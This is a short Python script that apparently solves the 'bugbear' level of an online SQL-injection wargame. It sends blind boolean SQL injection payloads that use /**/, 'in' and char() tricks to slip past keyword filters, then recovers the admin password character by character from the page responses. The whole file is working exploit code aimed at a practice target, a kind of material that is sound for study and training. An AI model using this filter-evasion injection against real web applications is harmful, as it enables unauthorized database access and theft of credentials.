import urllib.request
import sys

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?"
cookie = sys.argv[1]
pw = ''
letter = list(range(48, 64)) + list(range(97, 122))

for i in range(1, 9):
  for j in letter:
    query = "no=0||id/**/in/**/(char(97,100,109,105,110))%26%26mid(pw,{},1)/**/in/**/(char({}))".format(i,j)
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if 'Hello admin' in body:
      pw += chr(j)
      break
print(pw)
